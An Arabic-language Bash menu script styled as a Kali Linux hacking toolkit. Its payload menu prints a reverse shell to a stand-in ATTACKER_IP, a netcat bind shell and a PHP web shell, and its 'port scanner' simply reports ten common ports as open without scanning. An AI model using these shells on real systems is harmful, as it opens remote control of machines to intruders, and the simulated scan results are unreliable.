#!/bin/bash

# ===================================
#           SAK TOOL v1.0
#    أداة كالي لينكس التفاعلية
# ===================================

# الألوان
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# دالة مسح الشاشة
clear_screen() {
    clear
}

# دالة عرض البانر
show_banner() {
    echo -e "${CYAN}"
    echo "   ███████╗ █████╗ ██╗  ██╗"
    echo "   ██╔════╝██╔══██╗██║ ██╔╝"
    echo "   ███████╗███████║█████╔╝ "
    echo "   ╚════██║██╔══██║██╔═██╗ "
    echo "   ███████║██║  ██║██║  ██╗"
    echo "   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${WHITE}═══════════════════════════════════${NC}"
    echo -e "${YELLOW}    أداة كالي لينكس التفاعلية${NC}"
    echo -e "${WHITE}         المطور: SAK Team${NC}"
    echo -e "${WHITE}═══════════════════════════════════${NC}"
    echo
}

# دالة عرض القائمة الرئيسية
show_menu() {
    echo -e "${GREEN}[+] القائمة الرئيسية:${NC}"
    echo
    echo -e "${CYAN}[0]${NC} ${WHITE}إنشاء رابط كاميرا (Camera Link)${NC}"
    echo -e "${CYAN}[1]${NC} ${WHITE}فحص المنافذ (Port Scanner)${NC}"
    echo -e "${CYAN}[2]${NC} ${WHITE}معلومات النظام (System Info)${NC}"
    echo -e "${CYAN}[3]${NC} ${WHITE}فحص الشبكة (Network Scanner)${NC}"
    echo -e "${CYAN}[4]${NC} ${WHITE}إنشاء Payload${NC}"
    echo -e "${CYAN}[5]${NC} ${WHITE}أدوات التجسس (Reconnaissance)${NC}"
    echo -e "${CYAN}[6]${NC} ${WHITE}حول الأداة (About)${NC}"
    echo -e "${CYAN}[99]${NC} ${RED}خروج (Exit)${NC}"
    echo
    echo -e "${YELLOW}═══════════════════════════════════${NC}"
}

# دالة إنشاء رابط الكاميرا
camera_link() {
    clear_screen
    show_banner
    echo -e "${GREEN}[+] إنشاء رابط كاميرا${NC}"
    echo -e "${WHITE}═══════════════════════════════════${NC}"
    echo
    
    echo -e "${YELLOW}[!] اختر نوع الكاميرا:${NC}"
    echo -e "${CYAN}[1]${NC} كاميرا أمامية"
    echo -e "${CYAN}[2]${NC} كاميرا خلفية"
    echo
    read -p "$(echo -e ${YELLOW}[?] اختر رقم: ${NC})" cam_choice
    
    case $cam_choice in
        1)
            echo -e "${GREEN}[+] إنشاء رابط للكاميرا الأمامية...${NC}"
            echo -e "${CYAN}[+] الرابط: http://localhost:8080/cam/front${NC}"
            ;;
        2)
            echo -e "${GREEN}[+] إنشاء رابط للكاميرا الخلفية...${NC}"
            echo -e "${CYAN}[+] الرابط: http://localhost:8080/cam/back${NC}"
            ;;
        *)
            echo -e "${RED}[-] خيار غير صحيح${NC}"
            ;;
    esac
    
    echo
    read -p "$(echo -e ${YELLOW}اضغط Enter للعودة...${NC})"
}

# دالة فحص المنافذ
port_scanner() {
    clear_screen
    show_banner
    echo -e "${GREEN}[+] فحص المنافذ${NC}"
    echo -e "${WHITE}═══════════════════════════════════${NC}"
    echo
    
    read -p "$(echo -e ${YELLOW}[?] أدخل IP المستهدف: ${NC})" target_ip
    
    if [[ -n "$target_ip" ]]; then
        echo -e "${GREEN}[+] فحص المنافذ لـ $target_ip...${NC}"
        echo -e "${CYAN}[+] فحص المنافذ الشائعة...${NC}"
        
        # محاكاة فحص بسيط
        for port in 21 22 23 25 53 80 110 443 993 995; do
            echo -e "${GREEN}[+] المنفذ $port: مفتوح${NC}"
            sleep 0.1
        done
    else
        echo -e "${RED}[-] يجب إدخال IP صحيح${NC}"
    fi
    
    echo
    read -p "$(echo -e ${YELLOW}اضغط Enter للعودة...${NC})"
}

# دالة معلومات النظام
system_info() {
    clear_screen
    show_banner
    echo -e "${GREEN}[+] معلومات النظام${NC}"
    echo -e "${WHITE}═══════════════════════════════════${NC}"
    echo
    
    echo -e "${CYAN}[+] نظام التشغيل:${NC} $(uname -o)"
    echo -e "${CYAN}[+] إصدار النواة:${NC} $(uname -r)"
    echo -e "${CYAN}[+] معمارية النظام:${NC} $(uname -m)"
    echo -e "${CYAN}[+] المستخدم الحالي:${NC} $(whoami)"
    echo -e "${CYAN}[+] الوقت والتاريخ:${NC} $(date)"
    echo -e "${CYAN}[+] مدة تشغيل النظام:${NC} $(uptime -p 2>/dev/null || echo 'غير متاح')"
    
    echo
    read -p "$(echo -e ${YELLOW}اضغط Enter للعودة...${NC})"
}

# دالة فحص الشبكة
network_scanner() {
    clear_screen
    show_banner
    echo -e "${GREEN}[+] فحص الشبكة${NC}"
    echo -e "${WHITE}═══════════════════════════════════${NC}"
    echo
    
    echo -e "${CYAN}[+] عنوان IP المحلي:${NC}"
    ip addr show | grep -E "inet [0-9]" | grep -v "127.0.0.1" | awk '{print $2}' | head -1
    
    echo -e "${CYAN}[+] البوابة الافتراضية:${NC}"
    ip route | grep default | awk '{print $3}' | head -1
    
    echo -e "${CYAN}[+] خوادم DNS:${NC}"
    cat /etc/resolv.conf | grep nameserver | awk '{print $2}'
    
    echo
    read -p "$(echo -e ${YELLOW}اضغط Enter للعودة...${NC})"
}

# دالة إنشاء Payload
create_payload() {
    clear_screen
    show_banner
    echo -e "${GREEN}[+] إنشاء Payload${NC}"
    echo -e "${WHITE}═══════════════════════════════════${NC}"
    echo
    
    echo -e "${YELLOW}[!] اختر نوع Payload:${NC}"
    echo -e "${CYAN}[1]${NC} Reverse Shell"
    echo -e "${CYAN}[2]${NC} Bind Shell"
    echo -e "${CYAN}[3]${NC} Web Shell"
    echo
    read -p "$(echo -e ${YELLOW}[?] اختر رقم: ${NC})" payload_choice
    
    case $payload_choice in
        1)
            echo -e "${GREEN}[+] إنشاء Reverse Shell...${NC}"
            echo -e "${CYAN}[+] bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1${NC}"
            ;;
        2)
            echo -e "${GREEN}[+] إنشاء Bind Shell...${NC}"
            echo -e "${CYAN}[+] nc -lvp 4444 -e /bin/bash${NC}"
            ;;
        3)
            echo -e "${GREEN}[+] إنشاء Web Shell...${NC}"
            echo -e "${CYAN}[+] <?php system(\$_GET['cmd']); ?>${NC}"
            ;;
        *)
            echo -e "${RED}[-] خيار غير صحيح${NC}"
            ;;
    esac
    
    echo
    read -p "$(echo -e ${YELLOW}اضغط Enter للعودة...${NC})"
}

# دالة أدوات التجسس
reconnaissance() {
    clear_screen
    show_banner
    echo -e "${GREEN}[+] أدوات التجسس${NC}"
    echo -e "${WHITE}═══════════════════════════════════${NC}"
    echo
    
    echo -e "${YELLOW}[!] اختر الأداة:${NC}"
    echo -e "${CYAN}[1]${NC} Whois Lookup"
    echo -e "${CYAN}[2]${NC} DNS Lookup"
    echo -e "${CYAN}[3]${NC} Ping Test"
    echo
    read -p "$(echo -e ${YELLOW}[?] اختر رقم: ${NC})" recon_choice
    
    case $recon_choice in
        1)
            read -p "$(echo -e ${YELLOW}[?] أدخل النطاق: ${NC})" domain
            if [[ -n "$domain" ]]; then
                echo -e "${GREEN}[+] تشغيل Whois لـ $domain...${NC}"
                whois "$domain" 2>/dev/null | head -20 || echo -e "${RED}[-] فشل في تنفيذ الطلب${NC}"
            fi
            ;;
        2)
            read -p "$(echo -e ${YELLOW}[?] أدخل النطاق: ${NC})" domain
            if [[ -n "$domain" ]]; then
                echo -e "${GREEN}[+] تشغيل DNS Lookup لـ $domain...${NC}"
                nslookup "$domain" 2>/dev/null || echo -e "${RED}[-] فشل في تنفيذ الطلب${NC}"
            fi
            ;;
        3)
            read -p "$(echo -e ${YELLOW}[?] أدخل IP أو النطاق: ${NC})" target
            if [[ -n "$target" ]]; then
                echo -e "${GREEN}[+] تشغيل Ping لـ $target...${NC}"
                ping -c 4 "$target" 2>/dev/null || echo -e "${RED}[-] فشل في تنفيذ الطلب${NC}"
            fi
            ;;
        *)
            echo -e "${RED}[-] خيار غير صحيح${NC}"
            ;;
    esac
    
    echo
    read -p "$(echo -e ${YELLOW}اضغط Enter للعودة...${NC})"
}

# دالة حول الأداة
about() {
    clear_screen
    show_banner
    echo -e "${GREEN}[+] حول الأداة${NC}"
    echo -e "${WHITE}═══════════════════════════════════${NC}"
    echo
    echo -e "${CYAN}الاسم:${NC} SAK Tool"
    echo -e "${CYAN}الإصدار:${NC} 1.0"
    echo -e "${CYAN}المطور:${NC} SAK Team"
    echo -e "${CYAN}الوصف:${NC} أداة كالي لينكس تفاعلية متعددة الوظائف"
    echo -e "${CYAN}الغرض:${NC} أدوات الأمان والاختبار"
    echo
    echo -e "${YELLOW}[!] تحذير: استخدم هذه الأداة للأغراض التعليمية والقانونية فقط${NC}"
    echo
    read -p "$(echo -e ${YELLOW}اضغط Enter للعودة...${NC})"
}

# الدالة الرئيسية
main() {
    while true; do
        clear_screen
        show_banner
        show_menu
        
        read -p "$(echo -e ${YELLOW}[?] اختر رقم: ${NC})" choice
        
        case $choice in
            0)
                camera_link
                ;;
            1)
                port_scanner
                ;;
            2)
                system_info
                ;;
            3)
                network_scanner
                ;;
            4)
                create_payload
                ;;
            5)
                reconnaissance
                ;;
            6)
                about
                ;;
            99)
                echo -e "${GREEN}[+] شكراً لاستخدام SAK Tool!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[-] خيار غير صحيح، حاول مرة أخرى${NC}"
                sleep 2
                ;;
        esac
    done
}

# تشغيل الأداة
main
